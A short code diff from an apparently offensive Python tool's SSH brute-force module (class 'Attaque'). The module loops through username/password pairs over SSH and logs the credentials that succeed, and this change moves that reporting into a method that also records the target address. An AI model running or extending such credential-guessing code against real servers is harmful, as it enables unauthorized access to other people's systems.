@@ -23,12 +23,6 @@ class Attaque(Abstract):
                             try:
                                 client.connect(address, username=user, password=passwd)
                                 client.close()
-                                bilan([user,passwd])
+                                self.bilan(f"ssh_bruteforce{[address, user,passwd]}")
                             except:
                                 pass
-
-    def bilan(self, data):
-        user = data[0]
-        passwd = data[1]
-        self.log("[+] {}:{} connecté".format(user,passwd))
-                
